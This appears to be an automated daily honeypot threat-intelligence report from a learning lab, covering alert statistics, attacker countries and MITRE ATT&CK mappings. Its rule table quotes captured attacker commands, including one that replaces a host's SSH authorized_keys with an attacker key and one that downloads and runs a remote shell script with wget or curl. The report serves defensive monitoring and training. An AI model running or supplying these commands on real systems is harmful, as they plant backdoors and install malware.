# LearningLab01 Daily Threat Intelligence Report — 2026-10-09

Generated: 2026-10-09T13:15:05.050Z

Report window: 2026-10-08T13:15:05.025Z through 2026-10-09T13:15:05.025Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 256,430 |
| Attack-related alerts | 23,963 |
| Honeypot interactions | 234,297 |
| Authentication failures | 9,405 |
| Authentication successes | 480 |
| Critical alerts | 121 |
| High alerts | 497 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 121 critical-severity alerts require priority review.
- 497 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 19.59:1.
- Country attribution currently covers only 15.68% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (74,538 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 121 | 0.05% |
| High | 497 | 0.19% |
| Medium | 2,374 | 0.93% |
| Low | 253,438 | 98.83% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 9,405
- Authentication successes: 480
- Failure-to-success ratio: 19.59:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 11,946 | 49.85% |
| Payload delivery | 11,946 | 49.85% |
| Authentication failure | 9,405 | 39.25% |
| Command execution | 1,332 | 5.56% |
| Reconnaissance | 785 | 3.28% |
| Network scan | 246 | 1.03% |
| Malware | 105 | 0.44% |
| SMTP attack | 68 | 0.28% |
| Web attack | 35 | 0.15% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 40,218 alerts, representing 15.68% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 216,212 | 84.32% | Not geolocated |
| Bulgaria | 38,297 | 14.93% | ████████████████████ |
| Republic of Moldova | 1,394 | 0.54% | █ |
| Germany | 295 | 0.12% | █ |
| United Kingdom | 184 | 0.07% | █ |
| United States | 28 | 0.01% | █ |
| Hong Kong | 8 | 0.00% | █ |
| Russia | 3 | 0.00% | █ |
| Switzerland | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Mongolia | 2 | 0.00% | █ |
| Turkey | 2 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 320 |
| Initial Access | 319 |
| Persistence | 319 |
| Privilege Escalation | 319 |
| Credential Access | 131 |
| Lateral Movement | 111 |
| Execution | 25 |
| Impact | 11 |
| Command and Control | 7 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 319 |
| Brute Force | 131 |
| Remote Services | 111 |
| Command and Scripting Interpreter | 25 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 7 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 74,538 | T-Pot RDP connection from [IP address] to port 3389. | tpot (74,538) |
| 110204 | 4 | 48,833 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (48,833) |
| 110207 | 5 | 47,927 | T-Pot SentryPeer SIP activity from [IP address]:8216, method INVITE | tpot (47,927) |
| 110219 | 4 | 39,675 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (39,675) |
| 110205 | 6 | 11,846 | T-Pot Honeytrap received a payload from [IP address] | tpot (11,846) |
| 110101 | 3 | 10,209 | Cowrie SSH connection from [IP address]. | tpot (10,209) |
| 110209 | 5 | 9,637 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (9,637) |
| 110102 | 5 | 9,405 | Cowrie failed login from [IP address] using username root. | tpot (9,405) |
| 110104 | 7 | 1,179 | Cowrie captured a command from [IP address]: /bin/uname -s -v -n -m 2 > /dev/null | tpot (1,179) |
| 110201 | 4 | 585 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (585) |
| 110222 | 9 | 260 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (260) |
| 110214 | 9 | 241 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (241) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 208 | PAM: Login session opened. | tpot (206), wazuh (2) |
| 110221 | 7 | 188 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (188) |
| 5502 | 3 | 184 | PAM: Login session closed. | tpot (182), wazuh (2) |
| 110216 | 4 | 183 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (183) |
| 110103 | 10 | 161 | Cowrie accepted login from [IP address] using username root. | tpot (161) |
| 110106 | 10 | 131 | Cowrie detected repeated failed logins from [IP address]. | tpot (131) |
| 110109 | 13 | 121 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (121) |
| 5715 | 3 | 111 | sshd: authentication success. | tpot (110), wazuh (1) |
| 110212 | 10 | 100 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (100) |
| 110220 | 8 | 95 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (95) |
| 110105 | 12 | 73 | Cowrie captured a file download from [IP address]. | tpot (73) |
| 110217 | 7 | 68 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (68) |
| 110215 | 4 | 57 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (57) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110223 | 5 | 34 | T-Pot HoneyAML received  request from  to  on port . | tpot (34) |
| 110108 | 12 | 25 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (25) |
| 110208 | 7 | 23 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5065 | tpot (23) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 2904 | 7 | 8 | Dpkg (Debian Package) half configured. | tpot (8) |
| 110107 | 12 | 7 | Cowrie captured a probable payload-retrieval command from [IP address]: cd /tmp 2>/dev/null \|\| cd /var 2>/dev/null \|\| cd /dev/shm 2>/dev/null \|\| cd /run 2>/dev/null \|\| cd /root 2>/dev/null \|\| cd /;rm -f kla.sh;wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|busybox wget -O kla.sh http://[IP address]/bins/kla.sh 2>/dev/null\|\|curl -sLo kla.sh http://[IP address]/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet& | tpot (7) |
| 110211 | 9 | 5 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (5) |
| 2902 | 7 | 5 | New dpkg (Debian Package) installed. | tpot (5) |
| 203 | 9 | 3 | Agent event queue is full. Events may be lost. | tpot (3) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 202 | 7 | 2 | Agent event queue is 90% full. | tpot (2) |
| 205 | 3 | 2 | Agent event queue is back to normal load. | tpot (2) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110224 | 7 | 1 | T-Pot HoneyAML received an HTTP POST from [IP address] to /mcp. | tpot (1) |
| 19010 | 3 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
